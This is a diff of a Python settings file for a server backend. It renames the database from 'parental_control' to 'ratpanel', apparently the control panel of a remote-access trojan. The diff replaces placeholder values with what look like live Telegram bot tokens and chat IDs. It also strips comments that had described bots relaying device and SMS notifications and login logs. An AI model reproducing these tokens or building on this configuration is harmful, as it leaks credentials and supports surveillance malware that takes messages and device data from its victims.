@@ -6,7 +6,7 @@ import json
 class Settings(BaseSettings):
 
     MONGODB_URL: str = "mongodb://localhost:27017"
-    MONGODB_DB_NAME: str = "parental_control"
+    MONGODB_DB_NAME: str = "ratpanel"
 
     SERVER_HOST: str = "0.0.0.0"
     SERVER_PORT: int = 8765
@@ -16,42 +16,28 @@ class Settings(BaseSettings):
     JWT_ALGORITHM: str = "HS256"
     ACCESS_TOKEN_EXPIRE_MINUTES: int = 1440
 
-    # 2FA Bot Configuration (shared for all admins)
-    TELEGRAM_2FA_BOT_TOKEN: Optional[str] = "2FA_BOT_TOKEN_HERE"
-    TELEGRAM_2FA_CHAT_ID: Optional[str] = "-1002FA_CHAT_ID"
+    TELEGRAM_2FA_BOT_TOKEN: Optional[str] = "8579213664:AAFOMI_7RXQEyiBzSFoYJrIiKgukIGSnbv0"
+    TELEGRAM_2FA_CHAT_ID: Optional[str] = "5866597775"
     
     TELEGRAM_ENABLED: bool = True
     
-    # Administrator's 5 Telegram Bots (for the default super admin)
-    # Bot 1: Device notifications
-    ADMIN_BOT1_TOKEN: Optional[str] = "ADMIN_BOT1_TOKEN_HERE"
-    ADMIN_BOT1_CHAT_ID: str = "-1001ADMIN1_CHATID"
-
-    # Bot 2: SMS notifications
-    ADMIN_BOT2_TOKEN: Optional[str] = "ADMIN_BOT2_TOKEN_HERE"
-    ADMIN_BOT2_CHAT_ID: str = "-1002ADMIN2_CHATID"
-
-    # Bot 3: Admin activity logs
-    ADMIN_BOT3_TOKEN: Optional[str] = "ADMIN_BOT3_TOKEN_HERE"
-    ADMIN_BOT3_CHAT_ID: str = "-1003ADMIN3_CHATID"
-
-    # Bot 4: Login/Logout logs
-    ADMIN_BOT4_TOKEN: Optional[str] = "ADMIN_BOT4_TOKEN_HERE"
-    ADMIN_BOT4_CHAT_ID: str = "-1004ADMIN4_CHATID"
-
-    # Bot 5: Future use (app builds, etc.)
-    ADMIN_BOT5_TOKEN: Optional[str] = "ADMIN_BOT5_TOKEN_HERE"
-    ADMIN_BOT5_CHAT_ID: str = "-1005ADMIN5_CHATID"
+    ADMIN_BOT1_TOKEN: Optional[str] = "8012277816:AAEO7WvetFhJv9FP7E-JSi-i38TyiYucsNY"
+    ADMIN_BOT1_CHAT_ID: str = "-1002619104440"
+    ADMIN_BOT2_TOKEN: Optional[str] = "8348723871:AAHiw3LWbKJpjgGMgooZLGwOAHPbnIIyLKI"
+    ADMIN_BOT2_CHAT_ID: str = "-1003281785728"
+    ADMIN_BOT3_TOKEN: Optional[str] = "8566007628:AAEQCBPHEMjHkLlbM3TjooX-cbMt5Gs4UpI"
+    ADMIN_BOT3_CHAT_ID: str = "-1003234381315"
+    ADMIN_BOT4_TOKEN: Optional[str] = "8483775633:AAG49mPub-23eWPtcAV7qNH-6K0mWCasbn8"
+    ADMIN_BOT4_CHAT_ID: str = "-1003225189407"
+    ADMIN_BOT5_TOKEN: Optional[str] = "8590685447:AAHtKe6Bf4R5F6Dmrorn_vbnvOInpN3e-EY"
+    ADMIN_BOT5_CHAT_ID: str = "-1003258979582"
     
-    # Legacy Multi-Bot Configuration (DEPRECATED - kept for backward compatibility)
-    # ??? ???? ???? ??????? ?????? - ??????? ??????? ?? ??????? ?? ????? ????? ????
-    # For multi-bot setup per admin, configure via admin profile (telegram_bots field)
     TELEGRAM_BOTS: List[Dict[str, Any]] = []
     
     @field_validator('TELEGRAM_BOTS', mode='before')
     @classmethod
     def parse_telegram_bots(cls, v):
-        """Parse TELEGRAM_BOTS from JSON string or return empty list"""
+        
         if isinstance(v, str):
             try:
                 return json.loads(v) if v else []
